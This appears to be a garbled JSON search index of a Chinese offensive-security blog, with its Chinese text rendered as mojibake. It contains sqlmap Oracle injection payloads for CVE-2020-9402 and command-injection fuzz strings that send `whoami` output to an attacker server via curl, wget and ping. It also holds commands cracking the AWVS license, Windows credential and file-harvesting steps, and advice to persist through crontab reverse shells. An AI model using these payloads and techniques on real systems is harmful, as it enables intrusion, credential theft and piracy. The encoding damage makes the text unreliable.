·çš„æƒ…å†µçš„ã€‚è¿”å›å»åœ¨çœ‹webè™šæ‹Ÿæœºçš„æ—¥å¿—ï¼Œæœç„¶ï¼šdbè™šæ‹Ÿæœºæ•°æ®åº“æ–‡ä»¶æ‹·è´å®Œæˆåï¼Œè¿™è¾¹webè™šæ‹Ÿæœºé‡å¯åå¯åŠ¨æœåŠ¡å°±æ²¡æœ‰æŠ¥é”™äº†ï¼ŒæœåŠ¡è·‘åœ¨8000ç«¯å£ã€‚+cd/usr/src+wait-for-it.sh-t0db:1521--echo'oracleisup'wait-for-it.sh:waitingfordb:1521withoutatimeoutwait-for-it.sh:db:1521isavailableafter0secondsoracleisup+pythonmanage.pymakemigrationsMigrationsfor'vuln':vuln/migrations/0001_initial.py-CreatemodelNames-CreatemodelCollection-CreatemodelCollection2+pythonmanage.pymigrateOperationstoperform:Applyallmigrations:admin,auth,contenttypes,sessions,vulnRunningmigrations:Applyingcontenttypes.0001_initial...OKApplyingauth.0001_initial...OKApplyingadmin.0001_initial...OKApplyingadmin.0002_logentry_remove_auto_add...OKApplyingadmin.0003_logentry_add_action_flag_choices...OKApplyingcontenttypes.0002_remove_content_type_name...OKApplyingauth.0002_alter_permission_name_max_length...OKApplyingauth.0003_alter_user_email_max_length...OKApplyingauth.0004_alter_user_username_opts...OKApplyingauth.0005_alter_user_last_login_null...OKApplyingauth.0006_require_contenttypes_0002...OKApplyingauth.0007_alter_validators_add_error_messages...OKApplyingauth.0008_alter_user_username_max_length...OKApplyingauth.0009_alter_user_last_name_max_length...OKApplyingauth.0010_alter_group_name_max_length...OKApplyingauth.0011_update_proxy_permissions...OKApplyingsessions.0001_initial...OKApplyingvuln.0001_initial...OK+pythonmanage.pyloaddatacollection.jsonInstalled8object(s)from1fixture(s)+pythonmanage.pyshell-c'fromdjango.contrib.auth.modelsimportUser;User.objects.create_superuser('\\''admin'\\'','\\''admin@vulhub.org'\\'','\\''admin'\\'')ifnotUser.objects.filter(username='\\''admin'\\'').exists()else0'+execpythonmanage.pyrunserver0.0.0.0:8000#ä»¤äººå¤±æœ›çš„ç»“æœexecpythonmanage.pyrunserver0.0.0.0:8000çœ‹åˆ°è¿™ä¸ªæ—¥å¿—æ‰“å°å‡ºæ¥ï¼Œè§‰å¾—å¥½åƒç¡®å®æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†ï¼Œå†æ¥æŸ¥çœ‹ä¸€ä¸‹dockerçš„çŠ¶æ€ã€‚bin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcpçœ‹ä¸€çœ¼dockerçš„æƒ…å†µï¼Œéƒ½æ˜¯upçŠ¶æ€ã€‚è®¿é—®ä¸€ä¸‹8000ç«¯å£ç»ˆäºä¹Ÿå¯ä»¥è®¿é—®åˆ°webæœåŠ¡äº†ï¼Œä¸å†æ˜¯Emptyreplyfromserveräº†ã€‚bin4xin@bin4xin'sMacbookProCVE-2020-9402%curllocalhost:8000&lt;!DOCTYPEhtml&gt;&lt;htmllang=\"en\"&gt;&lt;head&gt;&lt;metahttp-equiv=\"content-type\"content=\"text/html;charset=utf-8\"&gt;&lt;title&gt;Pagenotfoundat/&lt;/title&gt;&lt;metaname=\"robots\"content=\"NONE,NOARCHIVE\"&gt;&lt;styletype=\"text/css\"&gt;html*{padding:0;margin:0;}body*{padding:10px20px;}body**{padding:0;}body{font:smallsans-serif;background:#eee;color:#000;}body&gt;div{border-bottom:1pxsolid#ddd;}h1{font-weight:normal;margin-bottom:.4em;}h1span{font-size:60%;color:#666;font-weight:normal;}table{border:none;border-collapse:collapse;width:100%;}td,th{vertical-align:top;padding:2px3px;}th{width:12em;text-align:right;color:#666;padding-right:.5em;}#info{background:#f6f6f6;}#infool{margin:0.5em4em;}#infoolli{font-family:monospace;}#summary{background:#ffc;}#explanation{background:#eee;border-bottom:0pxnone;}&lt;/style&gt;webè®¿é—®æ—¥å¿—ï¼šWatchingforfilechangeswithStatReloaderNotFound:/[11/Sep/202007:01:23]\"GET/HTTP/1.1\"4042137NotFound:/[11/Sep/202007:06:47]\"GET/HTTP/1.1\"4042141---Parameter:q(GET)Type:boolean-basedblindTitle:Oracleboolean-basedblind-ParameterreplacePayload:q=(SELECT(CASEWHEN(6457=6457)THEN6457ELSECAST(1ASINT)/(SELECT0FROMDUAL)END)FROMDUAL)Type:time-basedblindTitle:Oracletime-basedblind-Parameterreplace(DBMS_PIPE.RECEIVE_MESSAGE)Payload:q=(SELECT(CASEWHEN(6135=6135)THENDBMS_PIPE.RECEIVE_MESSAGE(CHR(83)||CHR(74)||CHR(88)||CHR(115),5)ELSE6135END)FROMDUAL)---[15:22:11][INFO]theback-endDBMSisOracleback-endDBMS:Oracle"
  },

  {
    "title"    : "ã€ŒæŠ€å·§ã€ï¼šLinux &amp; Unix Terminalå°æŠ€å·§",
    "category" : "",
    "tags"     : "ç¬”è®°, BASH, ä¿¡æ¯æœé›†",
    "url"      : "/blog/2020/use/vim/in/linux/",
    "date"     : "Sep 1, 2020",
    "content"  : "grepgrep-n\"get_spg2lsf\"-r./åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æŸ¥æ‰¾åŒ…å«get_spg2lsfå­—ç¬¦ä¸²çš„æ–‡ä»¶vimå¿«é€Ÿåˆ é™¤1ã€åˆ é™¤æ¯è¡Œå‰10ä¸ªå­—ç¬¦ï¼š:%s/^.\\{10\\}//å…¶ä¸­ï¼Œ%è¡¨ç¤ºæ‰€æœ‰è¡Œï¼Œsè¡¨ç¤ºæ›¿æ¢ï¼Œâ€%sâ€å¯ç”¨â€1,$â€ä»£æ›¿ï¼ˆä¸‹åŒï¼‰ï¼›æ­£åˆ™è¡¨è¾¾å¼â€/^.{10}//â€ä¸­ï¼Œ^è¡¨ç¤ºè¡Œé¦–ï¼›â€.â€è¡¨ç¤ºè¦åˆ é™¤çš„å­—ç¬¦ä¸ªæ•°ï¼Œâ€.{10}â€œè¡¨ç¤ºåˆ é™¤10ä¸ªå­—ç¬¦ï¼Œå¯ç”¨10ä¸ªâ€.â€è¡¨ç¤ºï¼›2ã€åˆ é™¤æ¯è¡Œå10ä¸ªå­—ç¬¦:%s/.\\{10\\}$//å­—ç¬¦ä¸²æ›¿æ¢vi/vimä¸­å¯ä»¥ä½¿ç”¨:så‘½ä»¤æ¥æ›¿æ¢å­—ç¬¦ä¸²ã€‚ã€€ã€€:s/vivian/sky/æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ªvivianä¸ºskyã€€ã€€:s/vivian/sky/gæ›¿æ¢å½“å‰è¡Œæ‰€æœ‰vivianä¸ºskyã€€ã€€:n,$s/vivian/sky/æ›¿æ¢ç¬¬nè¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªvivianä¸ºskyã€€ã€€:n,$s/vivian/sky/gæ›¿æ¢ç¬¬nè¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œæ‰€æœ‰vivianä¸ºskyawkåœ¨å®é™…ä¿¡æ¯æœé›†è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼šç°åœ¨æœ‰ä¸€ä¸ªhostsæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†æ‰€éœ€è¦ä¿¡æ¯æœé›†çš„åŸŸåå’Œipåœ°å€ï¼Œå…¶æ ¼å¼å¦‚ä¸‹å­˜å‚¨ï¼šdomain.com.cn,1.1.1.1é¦–å…ˆæŒ‰ç…§ä¿¡æ¯æœé›†çš„æ–¹å¼ç¬¬ä¸€æ­¥æˆ‘æ˜¯å…ˆè¿‡ä¸€éipæˆ–åŸŸåçš„ç«¯å£ï¼Œæ‰€ä»¥é—®é¢˜å°±æ¥äº†ï¼›nmapä¸æ”¯æŒè¿™ç§å½¢å¼è¿›è¡Œæ–‡ä»¶å†…å®¹è¯»å–ï¼Œéœ€ä»¥ä¸€è¡Œä¸€æ•°æ®çš„å½¢å¼ï¼Œå°±æ˜¯ï¼šdomain.com.cn1ip1domain.com.cn2ip2ä¸ç®¡æ˜¯åŸŸåè¿˜æ˜¯ipåœ°å€éƒ½æ˜¯ä»¥è¿™æ ·çš„å½¢å¼æ¥è¯»å–æ‰èƒ½ä½¿ç”¨-iLå‚æ•°æ¥è¯»å–æŒ‡å®šçš„åŸŸåæˆ–ipï¼Œæœ€åå®ç°æˆ‘ä»¬çš„ç«¯å£æ‰«æä»»åŠ¡ï¼Œæ‰€ä»¥æ˜¯éœ€è¦ä»¥é€—å·ä¸ºç•Œé™ï¼Œå°†ä¸¤åˆ—æ•°æ®åˆ†æˆä¸¤ä¸ªæ–‡ä»¶ï¼›æ•…æˆ‘ä»¬æ„æ€ä¸€ä¸‹æ€è·¯ï¼šä»¥é€—å·ä¸ºæ ‡ç¤ºï¼ŒæŠŠå‰é¢ä¸€åˆ—å’Œåé¢ä¸€åˆ—åˆ†åˆ«ä½¿ç”¨å‚æ•°$1ï¼Œ$2æ¥è¡¨ç¤ºï¼Œå°†$1è¾“å‡ºåˆ°domain1.txtï¼Œ$2è¾“å‡ºåˆ°domain2.txtä¸­ã€‚"
  },

  {
    "title"    : "ã€Œå®‰å…¨å·¥å…·ã€:A-Web_Vuln_Scanå’ŒaqåŸŸåçˆ†ç ´å·¥å…·",
    "category" : "",
    "tags"     : "ç¬”è®°, å®‰å…¨å·¥å…·, ä¿¡æ¯æœé›†",
    "url"      : "/blog/2020/useSecTools/aq_AWVS/",
    "date"     : "Jun 21, 2020",
    "content"  : "aqåŸŸåå·¥å…·æ­¤å¤„ä»…ä»…å¯¹äºaqå·¥å…·çš„æŠ¥é”™è¿›è¡Œéƒ¨åˆ†è®°å½•ï¼Œè‹¥å­˜åœ¨æ— æ³•è§£å†³çš„é—®é¢˜å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ã€‚gemæ¢æºgemå®‰è£…è½¯ä»¶ä¹‹å‰ä¸€å®šè¦æ¢æºï¼›gemsources--addhttps://gems.ruby-china.com/--removehttps://rubygems.org/npmconfigsetregistryhttps://registry.npm.taobao.orgä¾èµ–æŠ¥é”™geminstallaquatone&amp;&amp;npminstallelectron&amp;&amp;npminstallnightmareBuildingnativeextensions.Thiscouldtakeawhile...ERROR:Errorinstallingaquatone:ERROR:Failedtobuildgemnativeextension.currentdirectory:/var/lib/gems/2.7.0/gems/ffi-1.13.1/ext/ffi_c/usr/bin/ruby2.7-I/usr/lib/ruby/2.7.0-r./siteconf20200713-12887-ohoa28.rbextconf.rbmkmf.rbcan'tfindheaderfilesforrubyat/usr/lib/ruby/include/ruby.hYoumighthavetoinstallseparatepackagefortherubydevelopmentenvironment,ruby-devorruby-develforexample.æŠ¥ä»€ä¹ˆä¾èµ–çš„é”™å°±å®‰è£…ä¸Šä»€ä¹ˆä¾èµ–ï¼Œä¸Šé¢æŠ¥çš„é”™å•ç‹¬æ‹¿ä¸‹æ¥ï¼Œçœ‹åˆ°å¦‚ä¸‹å¾—æŠ¥é”™ã€‚Youmighthavetoinstallseparatepackagefortherubydevelopmentenvironment,ruby-devorruby-develforexample.$sudoaptinstallruby-develæŠŠä¾èµ–å®‰è£…ä¸Šå°±å¯ä»¥äº†ç„¶åé‡æ–°æ‰§è¡Œï¼šBuildingnativeextensions.Thiscouldtakeawhile...Successfullyinstalledffi-1.13.1Successfullyinstalledchildprocess-0.7.1Successfullyinstalledmulti_xml-0.6.0WhenyouHTTParty,youmustpartyhard!Successfullyinstalledhttparty-0.14.0Successfullyinstalledaquatone-0.5.0Parsingdocumentationforffi-1.13.1Installingridocumentationforffi-1.13.1Parsingdocumentationforchildprocess-0.7.1Installingridocumentationforchildprocess-0.7.1Parsingdocumentationformulti_xml-0.6.0Installingridocumentationformulti_xml-0.6.0Parsingdocumentationforhttparty-0.14.0Installingridocumentationforhttparty-0.14.0Parsingdocumentationforaquatone-0.5.0Installingridocumentationforaquatone-0.5.0Doneinstallingdocumentationforffi,childprocess,multi_xml,httparty,aquatoneafter6secondsï¼Ÿ+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+|exportLC_ALL=C|+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+npmæ¢æºåŒgem:-)npminstall-gelectron--registry=https://registry.npm.taobao.orgDEBUG=nightmarexvfb-runaquatone-gather-dksyun.com--threads10npminstall--savenightmare--unsafe-perm=true--allow-root--registry=https://registry.npm.taobao.orghttps://gh0st.cn/archives/2018-09-02/1é—®é¢˜aq-gatherçš„æ‰§è¡Œé—®é¢˜ï¼ŒæŠ¥é”™æœ‰å…³äºnightmareåŒæ—¶è¿™é‡Œaqå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæ‰§è¡Œaq-gatheræŠ¥é”™é‚£ä¹ˆå°±æ‰§è¡Œå¦‚ä¸‹ï¼Œå°±æ˜¯ä¸‹è½½ä¸€ä¸ªshellè„šæœ¬è¾“å‡ºåˆ°binæ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œã€‚wget\"https://gist.githubusercontent.com/random-robbie/beae1991e9ad139c6168c385d8a31f7d/raw/aq.sh\"-O/bin/aq&amp;&amp;chmod777/bin/aqç„¶åç›´æ¥aqæ‰§è¡Œå°±å¯ä»¥ã€‚aqæŠ¥é”™:issuerunningaquatone:issuerunningaquatonegoroutine6807[running]:runtime.throw(0x14dee2a,0x21)æŒ‡å®šå‚æ•°threadså’Œtimeï¼šé™ä½çº¿ç¨‹æ•°å’Œå¢å¤§è¶…æ—¶æ—¶é—´ï¼Œè¿™é‡Œå¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ä¸€ä¸‹çº¿ç¨‹æ•°çš„æŒ‡å®šå‚æ•°å’Œtimeoutçš„æŒ‡å®šæ ¼å¼ã€‚awvs-linuxå®‰è£…awvs13è¿˜æ˜¯å¾ˆé¦™çš„ã€‚ä¸ºäº†ä¿æŠ¤åŸå§‹licenseä¸å¤±æ•ˆï¼Œè¿™é‡Œå°½å¿«æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤ï¼Œä¸ç„¶licenseä¼šè¢«ä¿®æ”¹ç„¶åå°±æ— æ³•ç ´è§£æˆåŠŸã€‚root@kali:~#chattr+i/home/acunetix/.acunetix_trial/data/license/license_info.jsonroot@kali:~#rm-fr/home/acunetix/.acunetix_trial/data/license/wa_data.datroot@kali:~#touch/home/acunetix/.acunetix_trial/data/license/wa_data.datroot@kali:~#chattr+i/home/acunetix/.acunetix_trial/data/license/wa_data.datä¸ªäººå¼ºçƒˆæ¨èï¼šdockerç‰ˆæœ¬ã€‚dockeré•œåƒä¸‹è½½çš„å‘½ä»¤å¯ä»¥å‚è€ƒå›½å…‰å¸ˆå‚…çš„åšå®¢ã€‚"
  },

  {
    "title"    : "ã€ŒFuzzã€:æµ…è°ˆä¸€äº›æ¨¡ç³ŠåŒ¹é…æœé›†ä¿¡æ¯çš„æŠ€å·§",
    "category" : "",
    "tags"     : "ç¬”è®°, fuzz, ä¿¡æ¯æœé›†",
    "url"      : "/blog/2020/learn/to/fuzz/",
    "date"     : "Jun 10, 2020",
    "content"  : "å†™åœ¨æ–‡å‰ï¼šæˆ‘ä»¬åœ¨webæ”»é˜²æœŸé—´æœ‰å¾ˆå¤šæ—¶å€™æœ‰ä¸€ç§æ„Ÿè§‰ï¼šé‚£å°±æ˜¯é‡åˆ°rceæ¼æ´æ—¶ï¼Œbpæ”¾åŒ…çš„æ—¶å€™æœ‰ä¸€ç§éšéšçš„æ„Ÿè§‰ï¼Œæœ‰çš„æ—¶å€™bpçš„ååŒ…å­—èŠ‚å¤§å°è«åå…¶å¦™çš„æ€ªå¼‚ï¼Œæœ‰ç»éªŒçš„è€å¸ˆå‚…å°±ç´¢æ€§ç›´æ¥è·‘RCEçš„fuzzå­—å…¸ï¼Œæ‰€ä»¥æœ¬ç¯‡å°±æ—¥å¸¸è®°å½•ä¸€äº›æœ‰å…³äºwebæ”»é˜²æœŸé—´çš„ä¸€äº›fuzzæŠ€å·§æœåŠ¡å™¨RCEçš„fuzzæŠ€å·§Windowsæœºå™¨çš„fuzzå³æˆ‘ä»¬å¯ä»¥åœ¨å…³é”®å‚æ•°åé¢ä½¿ç”¨ç®¡é“ç¬¦å·å’Œè¿æ¥ç¬¦fuzzå‘½ä»¤æ‰§è¡Œå®ç°æˆ‘ä»¬çš„ç›²æ‰“ï¼š||å’Œ&amp;linuxæœºå™¨çš„fuzzåŒä¸Š||å’Œ&amp;Linuxä¸‹è¿‡æ»¤ç©ºæ ¼å¯ä»¥ä½¿ç”¨:${IFS},$IFS,$IFS$9JSONæ ¼å¼ä¸‹çš„æµ‹è¯•:\\u000awget\\u0020http://ipLinuxä¸‹å¯ä»¥åŒ…æ‹¬åå¼•å·ï¼Œwindowsä¸‹ä¸å¯ä»¥ã€‚Linuxä¸‹æ­£å¸¸æµ‹è¯•rce:æœåŠ¡å™¨å¯åŠ¨webï¼Œæ³¨æ„éœ€è¦å¤„äºç›‘å¬çŠ¶æ€ä¸‹å¯åŠ¨ï¼šbin4xin@bin4xin'sMacbookProtools%python3-mhttp.serverServingHTTPon::port8000(http://[::]:8000/)...rcefuzzå‘½ä»¤å¦‚ä¸‹ï¼šbin4xin@bin4xin'sMacbookProtools%curl192.168.101.51:8000/`whoami`åŒæ—¶æˆ‘ä»¬åè¿‡æ¥çœ‹webæ—¥å¿—è®°å½•ï¼š::ffff:192.168.101.51--[19/Sep/202013:57:25]\"GET/bin4xinHTTP/1.1\"301-åŒç†å„ä½å¯ä»¥å‘æ•£æ€ç»´ï¼špingwhoami.æœåŠ¡å™¨åœ°å€å¦‚ä¸Šï¼Œpingã€curlåŒæ ·é€‚ç”¨ã€‚ä¸€äº›ç‰¹æ®Šå­—ç¬¦ç»•è¿‡å§¿åŠ¿:curlhttp://æœåŠ¡å™¨åœ°å€/$(whoami)curlhttp://æœåŠ¡å™¨åœ°å€/$(whoami|base64)'w'g'e't${IFS}æœåŠ¡å™¨åœ°å€å„ä½å¯ä»¥è‡ªè¡Œå®éªŒåœ¨linuxä¸‹çš„æ•ˆæœã€‚Windowsæ¢æµ‹:fuzzæŠ€å·§æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯fuzzå‘½ä»¤æœ‰ä¸€äº›åŒºåˆ«ï¼›ping%USERNAME%.æœåŠ¡å™¨åœ°å€------(è·å–è®¡ç®—æœºå)for/F%xin('whoami')dostarthttp://æœåŠ¡å™¨åœ°å€/%x------(è·å–ç”¨æˆ·åç§°)for/F\"delims=\\tokens=2\"%iin('whoami')doping-n1%i.æœåŠ¡å™¨åœ°å€------æµ‹è¯•é‚®ç®±:`wget%209æœåŠ¡å™¨åœ°å€/xxxx`@qq.comæµ‹è¯•ä¸Šä¼ :`sleep10`filenameæµ‹è¯•filenname:`||wget%20æœåŠ¡å™¨åœ°å€`æµ‹è¯•ä¸Šä¼ å¤„ä¸‹çš„åç§°:;payload|payload&amp;payload;whoami|whoami&amp;whoami------ä¸ªäººæœºå™¨ä¿¡æ¯æ”¶é›†æµè§ˆå™¨[Chrome,Firefox,Edge,IE,360,QQ]ä¿¡æ¯(å†å²è®°å½•ï¼Œå¯†ç ï¼Œä¹¦ç­¾ï¼Œcookie)ï¼š%LocalAppData%\\Google\\Chrome\\UserData\\Default%APPDATA%\\Mozilla\\Firefox\\Profiles\\xxxxxxxx.default\\æœºå™¨å†…æ•æ„Ÿæ–‡ä»¶ï¼Œå…³é”®è¯ï¼šè´¦å·ã€å¯†ç ã€å¤‡ä»½ã€ç™»å½•ã€ç®¡ç†ã€é‚®ç®±ã€åå°ã€èµ„äº§ã€ç½‘ç»œfor/rD:\\%iin(*å¯†ç *)do@echo%ifor/rD:\\%iin(*vpn*)do@echo%ifor/rD:\\%iin(*è´¦å·*)do@echo%iæœºå™¨è¿›ç¨‹æ€è½¯/edrteamviewer/ç­‰è¿œç¨‹ç®¡ç†å·¥å…·æœåŠ¡ç±»è¿›ç¨‹ï¼šmssql/java/webæœåŠ¡å®‰è£…è½¯ä»¶åˆ—è¡¨å½“å‰windowså‡­è¯ç®¡ç†å™¨å­˜å‚¨çš„å¯†ç ç™»å½•å¯†ç ï¼ˆmimikatzï¼‰wifiå¯†ç outlookå¯†ç â€¦â€¦æœºå™¨å¼€æ”¾ç«¯å£ä¿¡æ¯/é˜²ç«å¢™ä¿¡æ¯/è·å–æœºå™¨å…±äº«netstat-naopwmicsharegetname,path,status#åˆ©ç”¨wmicæŸ¥æ‰¾å…±äº«è·å–æœºå™¨æ‰€æœ‰rdpè¿æ¥è®°å½•è·å–æ‰€æœ‰ç›˜ç¬¦wmiclogicaldiskwheredrivetype=3getname,freespace,systemname,filesystem,volumeserialnumber,size#æŸ¥çœ‹åˆ†åŒºè·å–å…¨ç›˜æ‰€æœ‰æ•æ„Ÿæ–‡ä»¶.doc\\xlsx\\md\\sql\\ppt*\\txtfor/rD:\\%iin(*.doc)do@echo%ifor/rD:\\%iin(*.xlsx)do@echo%ifor/rD:\\%iin(*.ppt*))do@echo%iæœ¬åœ°ç¯å¢ƒhostsç¯å¢ƒå˜é‡è¡¥ä¸åˆ—è¡¨å½“å‰ä¸»æœºçš„ä¼šè¯ä¿¡æ¯å·¥ä½œä¸é¥±å’Œæ€»ç»“äº†ä¸€ä¸‹ä¸ªäººåŠå…¬æœºä¿¡æ¯æ”¶é›†æ€è·¯"
  },

  {
    "title"    : "ã€Œä¿¡æ¯æœé›†ã€:æ¼«è°ˆä¸€äº›åœ¨å†…ç½‘çš„ä¿¡æ¯æœé›†æŠ€å·§",
    "category" : "",
    "tags"     : "vulnhub, å†…ç½‘, ä¿¡æ¯æœé›†",
    "url"      : "/blog/2020/walkthrough/insideNet/",
    "date"     : "Jun 8, 2020",
    "content"  : "ç»å†è¿‡å‡ æ¬¡HWè¡ŒåŠ¨ï¼Œæ¯æ¬¡HWéƒ½è¿æ°”è¾ƒå¥½å¯ä»¥æ‹¿åˆ°æœåŠ¡å™¨ï¼Œäºæ˜¯æ¯æ¬¡å…¬å¸çš„å†…ç½‘æ¸—é€çš„ä»»åŠ¡å°±äº¤ç»™æˆ‘ï¼Œè®°å½•ä¸€ä¸‹å¯¹äºå†…ç½‘çš„ä¿¡æ¯æœé›†è¿‡ç¨‹ï¼Œä»¥åŠåœ¨æ­¤è¿‡ç¨‹ä¸­æˆ‘è‡ªå·±æ‰€ç§¯ç´¯çš„å°æŠ€å·§ã€‚2021å¹´3æœˆ19æ—¥æ˜ŸæœŸäº”16æ—¶37åˆ†27ç§’CSTæ›´æ–°é‡æ„äº†éƒ¨åˆ†å°ç»“çš„å±•ç¤ºï¼šé‡æ–°è°ƒæ•´äº†æ–‡ç« çš„é˜è¿°æ¡†æ¶ï¼Œå°½å¯èƒ½ä»å®æˆ˜è§’åº¦å‡ºå‘ï¼Œè¿›è¡Œç« èŠ‚å®‰æ’ï¼›å°½é‡ä½¿å¾—å‰åå°ç»“æ›´åŠ ç´§å‡‘ï¼Œé˜è¿°é€»è¾‘æ›´åŠ æ¸…æ™°ã€‚åŠ å…¥äº†å°½å¯èƒ½å¤šçš„markdownè¯­æ³•ï¼Œæ–‡ç« ç»“æ„æ¸…æ™°çš„åŒæ—¶ï¼Œè®©é¡µé¢æ›´åŠ èµå¿ƒæ‚¦ç›®ã€‚å†™åœ¨æ–‡å‰ï¼šå¹´åå›æ¥å°±ä¸€ç›´åœ¨è‚ä»£ç ï¼Œè‚çš„å¿«å¤±å»ä¿¡å¿ƒäº†ï¼›æ­£å¥½ä¸‰æœˆä¸­æ—¬æœ‰åœºå…¨å›½èŒƒå›´çš„æ”»é˜²æ¼”ç»ƒï¼Œå°±æ¥é‡æ–°æ‹¾èµ·ä¿¡å¿ƒï½æ¼”ç»ƒç»“æŸå†è‚ä»£ç å†å¤±å»ä¿¡å¿ƒï¼Œå¾ªç¯å¾€å¤=ã€‚=æœ¬æ–‡ç€é‡ä»å®æˆ˜è§’åº¦ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œä»è·å–çš„è·³æ¿æœºä¸ºå…¥å£è¿›è¡Œé˜è¿°ï¼ŒåŸºæœ¬çš„é€»è¾‘ä¸ºï¼šè·³æ¿æœº-&gt;å†…ç½‘ä»£ç†-&gt;ä¿¡æ¯æœé›†-&gt;æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨æˆ‘ä»¬ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œæ‹¿åˆ°ä¸€ä¸ªè·³æ¿æœºçš„æƒé™åé¦–å…ˆæ˜¯å¯¹è·³æ¿æœºæ‰€åœ¨çš„åŒºåŸŸè¿›è¡Œè·¯ç”±åˆ’åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·çš„æ€è·¯æ¥åˆ¤æ–­è·å¾—å†…ç½‘ä¸­æœé›†åˆ°çš„ä¿¡æ¯æ˜¯å¦åˆ©äºæˆ‘ä»¬è¿›ä¸€æ­¥æ¸—é€ï¼ŒåŒæ—¶æˆ‘ä»¬åœ¨æ­¤è¿‡ç¨‹ä¸­ä¹Ÿéœ€è¦å°å¿ƒè°¨æ…ï¼Œæ”»é˜²æ¼”ç»ƒä¸­æˆ‘æ‰€é‡åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯ç”Ÿäº§ç¯å¢ƒï¼Œåœ¨å’Œå¼€å‘ã€è¿ç»´äººå‘˜åšå¼ˆçš„è¿‡ç¨‹ä¸­è¦åšåˆ°ï¼šæ‚„æ‚„åœ°æ¥ã€æ‚„æ‚„çš„èµ°åºŸè¯ä¸å¤šè¯´ï¼Œæ–‡ç¬”è¾ƒèœï¼Œæ–‡ç« æƒå½“æŠ›ç –å¼•ç‰ï¼Œå›åˆ°æ­£é¢˜ã€‚é›¶ï¼šåœ¨æœºå™¨ä¸Šçš„ä¿¡æ¯æœé›†æ¸—é€çš„æœ¬è´¨å°±æ˜¯ä¿¡æ¯æœé›†0x01ï¼šä¸ªäººå·¥ä½œæœºå™¨ä¿¡æ¯æœé›†è¿™æ–¹é¢æˆ‘æœ¬äººäº†è§£çš„ä¸æ˜¯å¾ˆå¤šï¼Œä¸€èˆ¬æ¥è¯´æ˜¯é€šè¿‡é’“é±¼é‚®ä»¶çš„å½¢å¼è·å–çš„WINDOWSPCæƒé™ï¼Œå¯ä»¥å‚è€ƒæˆ‘å¦ä¸€ç¯‡ä»ç½‘ä¸Šçš„æ¬è¿è¿‡æ¥çš„æ–‡ç« ï¼šä¸ªäººæœºå™¨ä¿¡æ¯æ”¶é›†0x02ï¼šWEBæœåŠ¡å™¨ä¿¡æ¯æœé›†ä¸€èˆ¬å»ºè®®å¯ä»¥ä»¥rootç”¨æˆ·æ–°å»ºç”¨æˆ·æ¥ç»´æŒæƒé™ï¼Œæˆ–è€…æ˜¯å†™å…¥corntabè®¡åˆ’æ¥å®šæ—¶åå¼¹shellã€‚å®æ“ä¸­å‡ ä¹å¾ˆå°‘æœ‰è¿ç»´ã€å¼€å‘å»æ£€æŸ¥å®šæ—¶è®¡åˆ’çš„åå¼¹shellè„šæœ¬ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³åæŒç»­æ¸—é€çš„æ¡ä»¶ã€‚#é…ç½®æ–‡ä»¶æ•°æ®åº“é…ç½®ä¿¡æ¯é€šè¿‡mybatisç­‰é…ç½®æ–‡ä»¶å°±å¯ä»¥æ‹¿åˆ°å†…ç½‘ä¸­å¯¹åº”çš„æ•°æ®åº“æœºå™¨ï¼Œä¸€èˆ¬éƒ½æ˜¯ä½æƒé™ï¼Œè¿æ°”å¥½å¯ä»¥æ‹¿åˆ°é«˜æƒé™ã€‚è¿æ°”å†å¥½ä¸€ç‚¹å­˜åœ¨é«˜æƒé™çš„mssqlæ•°æ®åº“å¯ä»¥å°è¯•è¿æ¥ä¸€ä¸‹å°è¯•xp_cmd_shellæ¥æ‰§è¡Œå‘½ä»¤ã€‚æˆ‘ä»¬é€šè¿‡webå±‚é¢æ‹¿åˆ°çš„æœºå™¨ï¼Œä¸€èˆ¬éƒ½æ˜¯webæœåŠ¡å™¨ï¼Œå³å­˜åœ¨å„ç§jaråŒ…ï¼Œæ‰€ä»¥æœåŠ¡å™¨é‡Œä¼šå­˜æ”¾å¤§é‡é…ç½®æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹æœç´¢å­˜åœ¨å­—ç¬¦ä¸º'mysql'çš„æ–‡ä»¶grep-rn\"mysql\".=======æŸ¥çœ‹å¯¹åº”ç³»ç»Ÿçš„æ•æ„Ÿé…ç½®æ–‡ä»¶catstatic/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php=======curlifconfig.me120.25.13.49é€šè¿‡è¿›ç¨‹ä»»åŠ¡å¯ä»¥æŸ¥æ‰¾åˆ°éƒ¨ç½²jaråŒ…çš„ç›®å½•å’Œç›¸å¯¹åº”ä¾èµ–ï¼Œå¤§éƒ¨åˆ†è¿ç»´å’Œå¼€å‘éƒ½ä¹ æƒ¯äºåœ¨æ 